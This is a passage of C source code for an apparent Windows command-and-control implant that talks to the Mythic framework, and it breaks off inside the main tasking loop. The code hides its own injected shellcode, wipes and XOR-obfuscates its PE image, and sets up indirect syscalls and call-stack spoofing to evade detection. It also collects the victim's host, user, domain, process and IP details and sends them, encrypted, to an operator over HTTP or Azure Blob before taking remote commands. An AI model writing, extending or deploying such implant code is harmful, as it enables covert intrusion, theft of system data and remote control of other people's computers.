        es_memset(&mbi, 0, sizeof(mbi));
        if (!gate_VirtualQuery(inst,
                (PVOID)((PBYTE)alloc_base + alloc_size), &mbi, sizeof(mbi)))
            break;
    }

    inst->pOriginalAlloc = alloc_base;
    inst->szOriginalAlloc = alloc_size;
}

static VOID cleanup_shellcode(PINSTANCE inst) {
    if (!inst->pOriginalAlloc || !inst->szOriginalAlloc) return;

    MEMORY_BASIC_INFORMATION mbi;
    es_memset(&mbi, 0, sizeof(mbi));
    gate_VirtualQuery(inst, inst->pOriginalAlloc, &mbi, sizeof(mbi));

    DWORD old_prot = 0;
    if (mbi.Type == MEM_PRIVATE) {
        gate_VirtualProtect(inst, inst->pOriginalAlloc,
            inst->szOriginalAlloc, PAGE_READWRITE, &old_prot);
        es_memset(inst->pOriginalAlloc, 0, inst->szOriginalAlloc);
#if !defined(INJECTION_TECHNIQUE) || INJECTION_TECHNIQUE != 5 /* not cascade */
        // Cascade builds keep the allocation (see agent_main comment): a
        // pending pre-sanitizer APC still points here; freeing recycles the
        // pages and a late APC executes recycled memory.
        gate_VirtualFree(inst, inst->pOriginalAlloc, 0, MEM_RELEASE);
        DBG(inst, "[ES] Cleanup: freed private shellcode allocation");
#else
        DBG(inst, "[ES] Cleanup: zeroed private shellcode allocation (cascade: kept)");
#endif
    } else if (mbi.Type == MEM_IMAGE) {
        gate_VirtualProtect(inst, inst->pOriginalAlloc,
            inst->szOriginalAlloc, PAGE_READWRITE, &old_prot);
        es_memset(inst->pOriginalAlloc, 0, inst->szOriginalAlloc);
        gate_VirtualProtect(inst, inst->pOriginalAlloc,
            inst->szOriginalAlloc, old_prot, &old_prot);
        DBG(inst, "[ES] Cleanup: zeroed image shellcode allocation");
    }

    inst->pOriginalAlloc = NULL;
    inst->szOriginalAlloc = 0;
}
#endif

#ifdef INCLUDE_EVASION_STOMPPE
static VOID stomp_pe_headers(PINSTANCE inst, PVOID dll_base) {
    if (!dll_base) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
    if (dos->e_magic != 0x5A4D) return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dll_base + dos->e_lfanew);
    DWORD headers_size = nt->OptionalHeader.SizeOfHeaders;
    if (headers_size == 0) headers_size = 0x1000;

    DWORD old_prot = 0;
    if (gate_VirtualProtect(inst, dll_base, headers_size, PAGE_READWRITE, &old_prot)) {
        es_memset(dll_base, 0, headers_size);
        gate_VirtualProtect(inst, dll_base, headers_size, old_prot, &old_prot);
        DBG(inst, "[ES] StompPE: zeroed PE headers");
    }
}
#endif

#ifdef INCLUDE_EVASION_OBFUSCATE
static VOID obfuscate_pe_sections(PINSTANCE inst, PVOID dll_base) {
    if (!dll_base) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_base;
    if (dos->e_magic != 0x5A4D) return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dll_base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD num_sec = nt->FileHeader.NumberOfSections;

    BYTE xor_key = 0x5A;

    for (WORD i = 0; i < num_sec; i++) {
        BOOL is_exec = (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
        if (is_exec) continue;

        PBYTE sec_addr = (PBYTE)dll_base + sec[i].VirtualAddress;
        DWORD sec_size = sec[i].Misc.VirtualSize;
        if (sec_size == 0) continue;

        DWORD old_prot = 0;
        if (gate_VirtualProtect(inst, sec_addr, sec_size, PAGE_READWRITE, &old_prot)) {
            for (DWORD j = 0; j < sec_size; j++)
                sec_addr[j] ^= xor_key;
            gate_VirtualProtect(inst, sec_addr, sec_size, old_prot, &old_prot);
        }
    }

    DBG(inst, "[ES] Obfuscate: XOR'd non-executable sections");
}
#endif

VOID agent_init(PINSTANCE inst, HINSTANCE hDll) {
    SALT_RETAIN(inst);   // build-randomisation sink: keeps the per-build salt alive
#if defined(INJECTION_TECHNIQUE) && INJECTION_TECHNIQUE == 5 /* INJECT_CASCADE */
    // Kill the shim-callback re-invocation window before anything can free
    // the payload allocation (see cascade_sanitize_shims comment). Declared
    // here because injection.h only exposes inject_cascade under the same
    // condition - the forward declaration lives with the definition.
    VOID cascade_sanitize_shims(PINSTANCE inst);
    cascade_sanitize_shims(inst);
#endif
    resolve_apis(inst);
    DBG(inst, "[ES] APIs resolved");
    parse_config(inst, CONFIG_BYTES, sizeof(CONFIG_BYTES));
    DBG(inst, "[ES] Config parsed");
    inst->Running = TRUE;
    inst->Connected = FALSE;
    inst->KvCount = 0;
    inst->DataStoreCount = 0;
    inst->BofOutput = NULL;
    inst->BofOutputLen = 0;
    inst->BofOutputCap = 0;

    // Initialize Beacon Gate state
    inst->bBeaconGateEnabled = BEACON_GATE_ENABLED;
    inst->bBeaconGateMasking = BEACON_GATE_ENABLED;

#if BEACON_GATE_ENABLED
    DBG(inst, "[DEBUG] BeaconGate ENABLED (compile-time)");
#else
    DBG(inst, "[DEBUG] BeaconGate DISABLED (compile-time)");
#endif

    // Initialize default spawnto paths
    xstr(_s64, "C:\\Windows\\System32\\rundll32.exe");
    es_strcpy(inst->Spawnto.x64, _s64);
    xstr(_s86, "C:\\Windows\\SysWOW64\\rundll32.exe");
    es_strcpy(inst->Spawnto.x86, _s86);
    inst->Spawnto.x64_args[0] = '\0';
    inst->Spawnto.x86_args[0] = '\0';

    // Argue state
    inst->argue_args = NULL;
    inst->argue_len  = 0;

    // CLR pipe state
    inst->ClrPipeRead        = NULL;
    inst->ClrPipeWrite       = NULL;
    inst->ClrStdoutRedirected = FALSE;

    // Token / spawn-modification state
    inst->ImpersonationToken = NULL;
    inst->SpoofPPID          = 0;
    inst->BlockDlls          = FALSE;

    // Cleanup state
    inst->pOriginalAlloc  = NULL;
    inst->szOriginalAlloc = 0;

    // SMB P2P link state
    inst->Smb.pipe = NULL;
    inst->Smb.have_link_key = FALSE;
    inst->LinkedPeerCount = 0;
    inst->PendingMsgCount = 0;
    for (int _i = 0; _i < ES_MAX_LINKED_PEERS; _i++) {
        inst->LinkedPeers[_i].pipe = NULL;
        inst->LinkedPeers[_i].active = FALSE;
    }

    // Initialize BEACON_INFO (preserve allocatedMemory set by DLL_BEACON_USER_DATA)
    ALLOCATED_MEMORY savedAm;
    es_memcpy(&savedAm, &inst->BeaconInfo.allocatedMemory, sizeof(ALLOCATED_MEMORY));
    es_memset(&inst->BeaconInfo, 0, sizeof(BEACON_INFO));
    es_memcpy(&inst->BeaconInfo.allocatedMemory, &savedAm, sizeof(ALLOCATED_MEMORY));
    inst->BeaconInfo.version = ES_VERSION;
    inst->BeaconInfo.beacon_ptr = (char*)hDll;

    // Post-init evasion: stomp PE headers and obfuscate sections
#ifdef INCLUDE_EVASION_STOMPPE
    stomp_pe_headers(inst, (PVOID)hDll);
#endif

#ifdef INCLUDE_EVASION_OBFUSCATE
    obfuscate_pe_sections(inst, (PVOID)hDll);
#endif

    // Eagerly load sleepmask COFF so BeaconGate works before first sleep
#ifdef INCLUDE_EVASION_HELLSHALL
#ifdef _WIN64
    // HellsHall indirect syscalls - x64 only. On x86 (WOW64), 32-bit ntdll
    // doesn't use sysenter directly; it transitions through wow64cpu.dll's
    // heaven's gate. Direct sysenter from WOW64 context crashes.
    hellshall_init(inst);
    DBG(inst, "[ES] HellsHall initialized");
#endif
#endif

#ifdef INCLUDE_EVASION_CALLSTACK_SPOOF
#ifdef _WIN64
    // LACUNA ghost-chain callstack spoofing - x64 only.
    // Must run after HellsHall init and API resolution.
    callstack_spoof_init(inst);
    DBG(inst, "[ES] Callstack spoofing initialized");
#endif
#endif

#if BEACON_GATE_ENABLED

#ifdef SLEEPMASK_COFF_SIZE
    if (SLEEPMASK_COFF_SIZE > 0 && !inst->bSleepMaskLoaded) {
        sleepmask_load_coff(inst, (BYTE*)SLEEPMASK_COFF, SLEEPMASK_COFF_SIZE, "sleep_mask");
        DBG(inst, "[DEBUG] Sleepmask COFF loaded eagerly for BeaconGate");
    }
#endif
#endif
}

// ─── TLV helpers ───

static DWORD tlv_size(DWORD data_len) {
    return 5 + data_len; // type(1) + length(4) + data
}

static void tlv_pack(BYTE* buf, BYTE type, const BYTE* data, DWORD data_len) {
    buf[0] = type;
    buf[1] = (data_len >> 24) & 0xFF;
    buf[2] = (data_len >> 16) & 0xFF;
    buf[3] = (data_len >> 8)  & 0xFF;
    buf[4] = data_len & 0xFF;
    if (data && data_len > 0)
        es_memcpy(buf + 5, (PVOID)data, data_len);
}

static BOOL tlv_find(const BYTE* buf, DWORD buf_len, BYTE type,
                     const BYTE** out_data, DWORD* out_len) {
    DWORD pos = 0;
    while (pos + 5 <= buf_len) {
        BYTE t = buf[pos];
        DWORD len = ((DWORD)buf[pos+1] << 24) | ((DWORD)buf[pos+2] << 16) |
                    ((DWORD)buf[pos+3] << 8)  | buf[pos+4];
        pos += 5;
        if (pos + len > buf_len) break;
        if (t == type) {
            if (out_data) *out_data = buf + pos;
            if (out_len)  *out_len = len;
            return TRUE;
        }
        pos += len;
    }
    return FALSE;
}

// Wrap a TLV payload with the raw 36-byte UUID prefix that Mythic expects
// when mythic_encrypts = True. Mythic strips this prefix for routing, then
// passes the remainder to the translation container.
BYTE* wrap_with_uuid(PINSTANCE inst, BYTE* payload, DWORD payload_len, DWORD* out_len) {
    DWORD uuid_len = 36;
    DWORD total = uuid_len + payload_len;
    BYTE* buf = (BYTE*)es_malloc(inst, total);
    if (!buf) return NULL;
    es_memcpy(buf, inst->Config.uuid, uuid_len);
    if (payload && payload_len > 0)
        es_memcpy(buf + uuid_len, payload, payload_len);
    *out_len = total;
    return buf;
}

static void pack_be32(BYTE* out, DWORD val) {
    out[0] = (val >> 24) & 0xFF; out[1] = (val >> 16) & 0xFF;
    out[2] = (val >> 8) & 0xFF;  out[3] = val & 0xFF;
}

typedef struct _ES_IP_ADDR_STR {
    struct _ES_IP_ADDR_STR* Next;
    char IpAddress[16];
    char IpMask[16];
    DWORD Context;
} ES_IP_ADDR_STR;

typedef struct _ES_ADAPTER_INFO {
    struct _ES_ADAPTER_INFO* Next;
    DWORD ComboIndex;
    char AdapterName[260];
    char Description[132];
    UINT AddressLength;
    BYTE Address[8];
    DWORD Index;
    UINT Type;
    UINT DhcpEnabled;
    ES_IP_ADDR_STR* CurrentIpAddress;
    ES_IP_ADDR_STR IpAddressList;
} ES_ADAPTER_INFO;

BYTE* build_checkin_msg(PINSTANCE inst, DWORD* msg_len) {
    TRACE(inst, "checkin: entered");
    DWORD uuid_len = es_strlen(inst->Config.uuid);

    char hostname[256] = {0};
    DWORD hostname_len = sizeof(hostname);
    if (inst->Win32.GetComputerNameExA)
        inst->Win32.GetComputerNameExA(ComputerNameNetBIOS, hostname, &hostname_len);
    DWORD host_slen = es_strlen(hostname);
    TRACE(inst, "checkin: hostname done");

    char username[256] = {0};
    DWORD user_slen = 0;
    if (inst->Win32.OpenProcessToken && inst->Win32.GetTokenInformation && inst->Win32.LookupAccountSidA) {
        HANDLE hToken = NULL;
        if (inst->Win32.OpenProcessToken(inst->Win32.GetCurrentProcess(), 0x0008, &hToken)) {
            BYTE token_buf[256] = {0};
            DWORD ret_len = 0;
            if (inst->Win32.GetTokenInformation(hToken, TokenUser, token_buf, sizeof(token_buf), &ret_len)) {
                TOKEN_USER* tu = (TOKEN_USER*)token_buf;
                DWORD name_sz = sizeof(username);
                char _dom[256] = {0};
                DWORD dom_sz = sizeof(_dom);
                SID_NAME_USE snu;
                if (inst->Win32.LookupAccountSidA(NULL, tu->User.Sid, username, &name_sz, _dom, &dom_sz, &snu))
                    user_slen = es_strlen(username);
            }
            gate_CloseHandle(inst, hToken);
        }
    }

    DWORD pid = inst->Win32.GetCurrentProcessId ? inst->Win32.GetCurrentProcessId() : 0;
    TRACE(inst, "checkin: pid done");

    char domain[256] = {0};
    DWORD dom_slen = 0;
    typedef DWORD (WINAPI *fnGetEnvVarA)(LPCSTR, LPSTR, DWORD);
    xstr(_gev, "GetEnvironmentVariableA");
    fnGetEnvVarA pGetEnvVar = (fnGetEnvVarA)inst->Win32.GetProcAddress(
        (HMODULE)inst->Modules.Kernel32, _gev);
    if (pGetEnvVar) {
        xstr(_ud, "USERDOMAIN");
        DWORD r = pGetEnvVar(_ud, domain, sizeof(domain) - 1);
        if (r > 0 && r < sizeof(domain)) dom_slen = r;
    }
    TRACE(inst, "checkin: domain done");

    xstr(_arch, "x64");
    DWORD arch_slen = 3;

    xstr(_os, "Windows");
    DWORD os_slen = 7;

    char procname[512] = {0};
    DWORD proc_slen = 0;
    if (inst->Win32.GetModuleFileNameA)
        proc_slen = inst->Win32.GetModuleFileNameA(NULL, procname, sizeof(procname) - 1);
    TRACE(inst, "checkin: procname done");

    char ips[512] = {0};
    DWORD ips_slen = 0;
    STK_IPHLPAPI(_iphlp);
    HMODULE hIp = inst->Win32.LoadLibraryA(_iphlp);
    if (hIp) {
        typedef DWORD (WINAPI *fnGetAdaptersInfo)(ES_ADAPTER_INFO*, PULONG);
        xstr(_gai, "GetAdaptersInfo");
        fnGetAdaptersInfo pGAI = (fnGetAdaptersInfo)inst->Win32.GetProcAddress(hIp, _gai);
        if (pGAI) {
            ULONG buf_size = 0;
            pGAI(NULL, &buf_size);
            if (buf_size > 0 && buf_size < 65536) {
                ES_ADAPTER_INFO* ai = (ES_ADAPTER_INFO*)es_malloc(inst, buf_size);
                if (ai && pGAI(ai, &buf_size) == 0) {
                    ES_ADAPTER_INFO* cur = ai;
                    while (cur && ips_slen < sizeof(ips) - 20) {
                        char* ip = cur->IpAddressList.IpAddress;
                        if (ip[0] != '0' || ip[1] != '.') {
                            if (ips_slen > 0) ips[ips_slen++] = ';';
                            int il = es_strlen(ip);
                            es_memcpy(ips + ips_slen, ip, il);
                            ips_slen += il;
                        }
                        cur = cur->Next;
                    }
                }
                if (ai) es_free(inst, ai);
            }
        }
    }

    DWORD integrity = 2;

    TRACE(inst, "checkin: about to allocate");
    DWORD total = tlv_size(uuid_len) + tlv_size(host_slen) + tlv_size(user_slen) + tlv_size(4)
                + tlv_size(dom_slen) + tlv_size(arch_slen) + tlv_size(os_slen)
                + tlv_size(proc_slen) + tlv_size(ips_slen) + tlv_size(4) + tlv_size(0);
    BYTE* buf = (BYTE*)es_malloc(inst, total);
    if (!buf) return NULL;
    TRACE(inst, "checkin: allocated, packing TLVs");

    DWORD pos = 0;
    BYTE be4[4];

    tlv_pack(buf + pos, TLV_UUID, (const BYTE*)inst->Config.uuid, uuid_len); pos += tlv_size(uuid_len);
    tlv_pack(buf + pos, TLV_HOST, (const BYTE*)hostname, host_slen);        pos += tlv_size(host_slen);
    tlv_pack(buf + pos, TLV_USER, (const BYTE*)username, user_slen);        pos += tlv_size(user_slen);
    pack_be32(be4, pid);
    tlv_pack(buf + pos, TLV_PID, be4, 4);                                   pos += tlv_size(4);
    tlv_pack(buf + pos, TLV_DOMAIN, (const BYTE*)domain, dom_slen);         pos += tlv_size(dom_slen);
    tlv_pack(buf + pos, TLV_ARCH, (const BYTE*)_arch, arch_slen);           pos += tlv_size(arch_slen);
    tlv_pack(buf + pos, TLV_OS_INFO, (const BYTE*)_os, os_slen);            pos += tlv_size(os_slen);
    tlv_pack(buf + pos, TLV_PROCNAME, (const BYTE*)procname, proc_slen);    pos += tlv_size(proc_slen);
    tlv_pack(buf + pos, TLV_IPS, (const BYTE*)ips, ips_slen);               pos += tlv_size(ips_slen);
    pack_be32(be4, integrity);
    tlv_pack(buf + pos, TLV_INTEGRITY, be4, 4);                             pos += tlv_size(4);
    tlv_pack(buf + pos, TLV_EXT_IP, (const BYTE*)"", 0);                    pos += tlv_size(0);

    *msg_len = pos;
    TRACE(inst, "checkin: done");
    return buf;
}

// Build a get_tasking TLV message (simple: UUID + command only)
// Edge creation is now handled by ACTION_LINK_ADD messages sent separately.
static BYTE* build_get_tasking_msg(PINSTANCE inst, DWORD* msg_len) {
    DWORD uuid_len = es_strlen(inst->Config.uuid);
    xstr(_act, "get_tasking");
    const char* action = _act;
    DWORD action_len = es_strlen(action);

    // Collect all pending delegate blobs into a single TLV_DELEGATES payload.
    // Each pending message is a raw ACTION_LINK_ADD/MSG/REMOVE binary blob.
    // Concatenate them length-prefixed: [len32 + blob] [len32 + blob] ...
    BYTE* del_buf = NULL;
    DWORD del_total = 0;
    if (inst->PendingMsgCount > 0) {
        // Calculate total size
        for (DWORD i = 0; i < inst->PendingMsgCount; i++)
            del_total += 4 + inst->PendingMsgs[i].len;
        del_buf = (BYTE*)es_malloc(inst, del_total);
        if (del_buf) {
            DWORD dp = 0;
            for (DWORD i = 0; i < inst->PendingMsgCount; i++) {
                DWORD l = inst->PendingMsgs[i].len;
                del_buf[dp++] = (BYTE)((l >> 24) & 0xFF);
                del_buf[dp++] = (BYTE)((l >> 16) & 0xFF);
                del_buf[dp++] = (BYTE)((l >> 8)  & 0xFF);
                del_buf[dp++] = (BYTE)( l        & 0xFF);
                es_memcpy(del_buf + dp, inst->PendingMsgs[i].data, l);
                dp += l;
                es_free(inst, inst->PendingMsgs[i].data);
            }
            inst->PendingMsgCount = 0;
            del_total = dp;
        }
    }

    DWORD total = tlv_size(uuid_len) + tlv_size(action_len);
    if (del_buf && del_total > 0) total += tlv_size(del_total);
    BYTE* buf = (BYTE*)es_malloc(inst, total);
    if (!buf) { if (del_buf) es_free(inst, del_buf); return NULL; }

    DWORD pos = 0;
    tlv_pack(buf + pos, TLV_UUID, (const BYTE*)inst->Config.uuid, uuid_len);
    pos += tlv_size(uuid_len);
    tlv_pack(buf + pos, TLV_COMMAND, (const BYTE*)action, action_len);
    pos += tlv_size(action_len);
    if (del_buf && del_total > 0) {
        tlv_pack(buf + pos, TLV_DELEGATES, del_buf, del_total);
        pos += tlv_size(del_total);
        es_free(inst, del_buf);
    }
    *msg_len = pos;
    return buf;
}

// Queue a pending action-byte message for the main loop to send
void queue_pending_msg(PINSTANCE inst, BYTE* data, DWORD len) {
    if (inst->PendingMsgCount >= ES_MAX_PENDING_MSGS) {
        // Drop oldest if full
        es_free(inst, inst->PendingMsgs[0].data);
        for (DWORD i = 1; i < inst->PendingMsgCount; i++) {
            inst->PendingMsgs[i - 1] = inst->PendingMsgs[i];
        }
        inst->PendingMsgCount--;
    }
    inst->PendingMsgs[inst->PendingMsgCount].data = data;
    inst->PendingMsgs[inst->PendingMsgCount].len = len;
    inst->PendingMsgCount++;
}

// Find the end of the TLV stream (returns byte offset after last complete TLV)
static DWORD tlv_stream_end(const BYTE* buf, DWORD buf_len) {
    DWORD pos = 0;
    while (pos + 5 <= buf_len) {
        DWORD len = ((DWORD)buf[pos+1] << 24) | ((DWORD)buf[pos+2] << 16) |
                    ((DWORD)buf[pos+3] << 8)  | buf[pos+4];
        if (pos + 5 + len > buf_len) break;
        pos += 5 + len;
    }
    return pos;
}

// Build a response TLV message for a task result
static BYTE* build_response_msg(PINSTANCE inst, const char* task_id,
                                const BYTE* output, DWORD output_len,
                                BOOL is_error, DWORD* msg_len) {
    DWORD uuid_len = es_strlen(inst->Config.uuid);
    DWORD tid_len = es_strlen(task_id);
    xstr(_act, "post_response");
    const char* action = _act;
    DWORD action_len = es_strlen(action);

    DWORD total = tlv_size(uuid_len) + tlv_size(action_len) + tlv_size(tid_len);
    if (output && output_len > 0) {
        total += tlv_size(output_len);
    }

    BYTE* buf = (BYTE*)es_malloc(inst, total);
    if (!buf) return NULL;

    DWORD pos = 0;
    tlv_pack(buf + pos, TLV_UUID, (const BYTE*)inst->Config.uuid, uuid_len);
    pos += tlv_size(uuid_len);
    tlv_pack(buf + pos, TLV_COMMAND, (const BYTE*)action, action_len);
    pos += tlv_size(action_len);
    tlv_pack(buf + pos, TLV_TASKID, (const BYTE*)task_id, tid_len);
    pos += tlv_size(tid_len);

    if (output && output_len > 0) {
        tlv_pack(buf + pos, is_error ? TLV_ERROR : TLV_OUTPUT, output, output_len);
        pos += tlv_size(output_len);
    }

    *msg_len = pos;
    return buf;
}

// SMB-only builds have no egress channel; http_post_response lives in the
// HTTP transport. send_mythic_msg is never called on the SMB path (the SMB
// loop uses es_smb_process_tasking), so stub it to keep the TU compiling.
// Azure Blob builds swap the send call for the ats/sta polling transport;
// the wire format (base64 of uuid+payload) is identical, only the carrier
// changes. http.cc compiles out entirely in these builds.
#ifdef AZURE_BLOB_TRANSPORT
#define http_post_response blob_post_response
#elif !defined(HTTP_TRANSPORT)
static BOOL http_post_response_stub(PINSTANCE inst, BYTE* data, DWORD len,
                                    BYTE** resp, DWORD* rlen) {
    (void)inst; (void)data; (void)len;
    if (resp) *resp = NULL;
    if (rlen) *rlen = 0;
    return FALSE;
}
#define http_post_response http_post_response_stub
#endif

// Send a message to Mythic: encrypt → UUID-prepend → base64-encode → POST → base64-decode → strip UUID → decrypt
BOOL send_mythic_msg(PINSTANCE inst, BYTE* payload, DWORD payload_len,
                            BYTE** response, DWORD* resp_len) {
    TRACE(inst, "send_mythic_msg: entered");
    BYTE* send_data = payload;
    DWORD send_len = payload_len;
    BOOL encrypted = has_encryption_key(inst);

    if (encrypted) {
        BYTE* enc = NULL;
        DWORD enc_len = 0;
        if (!mythic_encrypt(inst, payload, payload_len, &enc, &enc_len)) {
            return FALSE;
        }
        send_data = enc;
        send_len = enc_len;
    }

    DWORD wrapped_len = 0;
    BYTE* wrapped = wrap_with_uuid(inst, send_data, send_len, &wrapped_len);
    if (encrypted) es_free(inst, send_data);
    if (!wrapped) return FALSE;

    DWORD b64_len = 0;
    BYTE* b64_data = base64_encode(inst, wrapped, wrapped_len, &b64_len);
    es_free(inst, wrapped);
    if (!b64_data) return FALSE;

    BYTE* raw_resp = NULL;
    DWORD raw_resp_len = 0;
    TRACE(inst, "send_mythic_msg: calling http_post_response");
    BOOL ok = http_post_response(inst, b64_data, b64_len, &raw_resp, &raw_resp_len);
    TRACE(inst, "send_mythic_msg: http_post_response returned");
    es_free(inst, b64_data);

    if (!ok || !raw_resp || raw_resp_len == 0) {
        if (raw_resp) es_free(inst, raw_resp);
        return FALSE;
    }

    DWORD decoded_len = 0;
    BYTE* decoded = base64_decode(inst, raw_resp, raw_resp_len, &decoded_len);
    es_free(inst, raw_resp);

    if (!decoded || decoded_len <= 36) {
        if (decoded) es_free(inst, decoded);
        if (response) *response = NULL;
        if (resp_len) *resp_len = 0;
        return decoded != NULL;
    }

    DWORD data_len = decoded_len - 36;
    BYTE* data_ptr = decoded + 36;

    if (encrypted && data_len > 0) {
        BYTE* plain = NULL;
        DWORD plain_len = 0;
        if (!mythic_decrypt(inst, data_ptr, data_len, &plain, &plain_len)) {
            es_free(inst, decoded);
            if (response) *response = NULL;
            if (resp_len) *resp_len = 0;
            return FALSE;
        }
        es_free(inst, decoded);
        if (response) {
            *response = plain;
            if (resp_len) *resp_len = plain_len;
        } else {
            es_free(inst, plain);
        }
    } else if (data_len > 0) {
        if (response) {
            BYTE* result = (BYTE*)es_malloc(inst, data_len);
            if (result) {
                es_memcpy(result, data_ptr, data_len);
                *response = result;
                if (resp_len) *resp_len = data_len;
            }
        }
        es_free(inst, decoded);
    } else {
        if (response) *response = NULL;
        if (resp_len) *resp_len = 0;
        es_free(inst, decoded);
    }

    return TRUE;
}

#ifdef SMB_TRANSPORT
// Shared tasking processor for the SMB P2P transport (declared in
// transport_smb.h). Mirrors the HTTP main loop's task handling: parse a
// decrypted get_tasking TLV message, dispatch the command through the same
// dispatch_command table, and return a plaintext post_response TLV message
// (the SMB transport encrypts it under the link session key).
VOID es_smb_process_tasking(PINSTANCE inst, const BYTE* msg, DWORD msg_len,
                            BYTE** out_resp, DWORD* out_resp_len) {
    *out_resp = NULL;
    *out_resp_len = 0;
    if (!msg || msg_len == 0) return;

    const BYTE* cmd_name = NULL; DWORD cmd_name_len = 0;
    const BYTE* task_id  = NULL; DWORD task_id_len  = 0;
    const BYTE* task_data = NULL; DWORD task_data_len = 0;

    if (!tlv_find(msg, msg_len, TLV_COMMAND, &cmd_name, &cmd_name_len) ||
        !tlv_find(msg, msg_len, TLV_TASKID, &task_id, &task_id_len))
        return;
    tlv_find(msg, msg_len, TLV_DATA, &task_data, &task_data_len);

    char cmd_buf[64] = {0};
    if (cmd_name_len < sizeof(cmd_buf))
        es_memcpy(cmd_buf, (PVOID)cmd_name, cmd_name_len);

    char tid_buf[40] = {0};
    if (task_id_len < sizeof(tid_buf))
        es_memcpy(tid_buf, (PVOID)task_id, task_id_len);

    // Mythic checkin response (delegate checkin flow): the TASKID carries our
    // newly assigned callback UUID. Update Config.uuid so all future traffic
    // uses it, and ack with an empty response.
    if (cmd_name_len == 7 &&
        cmd_buf[0]=='c' && cmd_buf[1]=='h' && cmd_buf[2]=='e' && cmd_buf[3]=='c' &&
        cmd_buf[4]=='k' && cmd_buf[5]=='i' && cmd_buf[6]=='n') {
        DWORD cp = 0;
        for (cp = 0; cp < task_id_len && cp < sizeof(inst->Config.uuid) - 1; cp++)
            inst->Config.uuid[cp] = tid_buf[cp];
        inst->Config.uuid[cp] = 0;
        *out_resp = NULL;
        *out_resp_len = 0;
        return;
    }

    BYTE* out_data = NULL;
    DWORD out_len = 0;
    BOOL  out_error = FALSE;

    dispatch_command(inst, cmd_buf, (BYTE*)task_data, task_data_len,
                     &out_data, &out_len, &out_error);

    DWORD resp_msg_len = 0;
    BYTE* resp_msg = build_response_msg(inst, tid_buf, out_data, out_len,
                                        out_error, &resp_msg_len);
    if (out_data) es_free(inst, out_data);

    *out_resp = resp_msg;
    *out_resp_len = resp_msg_len;
}
#endif // SMB_TRANSPORT

VOID agent_main(PINSTANCE inst) {
    inst->Running = TRUE;

    // In module-stomped mode, TRACE may crash because CreateFileA is resolved
    // but the inst passed here is in the sacrifice DLL's .text.
    // Let's verify the APIs are valid before using them.
#ifdef INCLUDE_EVASION_MODULE_STOMP
#ifdef _WIN64
    if (inst->ModuleStomp.bEntryPatched && inst->pOriginalAlloc && inst->szOriginalAlloc) {
        // Directly call VirtualProtect via function pointer - don't go through
        // gate_ wrapper or TRACE (both might access structures that are invalid
        // in the new copy).
        DWORD _mso = 0;
        if (inst->Win32.VirtualProtect) {
            inst->Win32.VirtualProtect(inst->pOriginalAlloc,
                inst->szOriginalAlloc, PAGE_READWRITE, &_mso);
        }
        es_memset(inst->pOriginalAlloc, 0, inst->szOriginalAlloc);
#if !defined(INJECTION_TECHNIQUE) || INJECTION_TECHNIQUE != 5 /* not cascade */
        // Cascade builds keep this allocation reserved: a pending APC queued
        // before the shim sanitizer ran still points here, and freeing lets
        // the loader recycle the pages - a late APC then AVs executing api-set
        // name strings (dump-verified rundll32.exe.7636.dmp). Zeroing kills
        // the Modified-Code IoC; the anonymous RW region stays mapped and a
        // stray re-entry faults on zeroed non-code instead of live strings.
        if (inst->Win32.VirtualFree) {
            inst->Win32.VirtualFree(inst->pOriginalAlloc, 0, MEM_RELEASE);
        }
#endif
        inst->pOriginalAlloc = NULL;
        inst->szOriginalAlloc = 0;
    }
#endif
#endif

    TRACE(inst, "agent_main: entered");
    DBG(inst, "[ES] agent_main entered");

    register_commands(inst);
    TRACE(inst, "agent_main: commands registered");

    TRACE(inst, "agent_main: pre-transport");
#ifdef HTTP_TRANSPORT
    TRACE(inst, "agent_main: transport=HTTP");
#endif
#ifdef AZURE_BLOB_TRANSPORT
    TRACE(inst, "agent_main: transport=AZURE_BLOB");
#endif
#if !defined(HTTP_TRANSPORT) && !defined(AZURE_BLOB_TRANSPORT)
    TRACE(inst, "agent_main: transport=NOT_EGRESS");
#endif
#ifdef SMB_TRANSPORT
    TRACE(inst, "agent_main: transport=SMB");
#endif

#if defined(HTTP_TRANSPORT) || defined(AZURE_BLOB_TRANSPORT)
    // Initial checkin
    DWORD checkin_len = 0;
    BYTE* checkin_msg = build_checkin_msg(inst, &checkin_len);
    TRACE(inst, "agent_main: build_checkin_msg returned");
    if (checkin_msg) {
        BYTE* resp = NULL;
        DWORD resp_len = 0;
        if (send_mythic_msg(inst, checkin_msg, checkin_len, &resp, &resp_len) && resp && resp_len > 0) {
            const BYTE* new_id = NULL;
            DWORD new_id_len = 0;
            if (tlv_find(resp, resp_len, TLV_TASKID, &new_id, &new_id_len) && new_id_len <= 36) {
                es_memcpy(inst->Config.uuid, (PVOID)new_id, new_id_len);
                inst->Config.uuid[new_id_len] = 0;
            }
            inst->Connected = TRUE;
            DBG(inst, "[ES] Checkin OK");
        }
        if (resp) es_free(inst, resp);
        es_free(inst, checkin_msg);
    }
    TRACE(inst, "agent_main: initial checkin attempted");

    DBG(inst, "[ES] Entering main loop");
    // Main tasking loop
    while (inst->Running) {
        if (!inst->Connected) {
            do_sleep(inst, inst->Config.sleep_ms);
            checkin_msg = build_checkin_msg(inst, &checkin_len);
            if (checkin_msg) {
                BYTE* resp = NULL;
                DWORD resp_len = 0;
                if (send_mythic_msg(inst, checkin_msg, checkin_len, &resp, &resp_len) && resp && resp_len > 0) {
                    const BYTE* new_id = NULL;
                    DWORD new_id_len = 0;
                    if (tlv_find(resp, resp_len, TLV_TASKID, &new_id, &new_id_len) && new_id_len <= 36) {
                        es_memcpy(inst->Config.uuid, (PVOID)new_id, new_id_len);
                        inst->Config.uuid[new_id_len] = 0;
                    }
                    inst->Connected = TRUE;
                }
                if (resp) es_free(inst, resp);
                es_free(inst, checkin_msg);
            }
            continue;
        }

        // Get tasks
        BYTE* tasks = NULL;
        DWORD tasks_len = 0;

        // Pending delegate messages are drained inside build_get_tasking_msg
        // and included as TLV_DELEGATES in the regular get_tasking TLV stream.

        DWORD get_msg_len = 0;
        BYTE* get_msg = build_get_tasking_msg(inst, &get_msg_len);
        if (get_msg) {
            send_mythic_msg(inst, get_msg, get_msg_len, &tasks, &tasks_len);
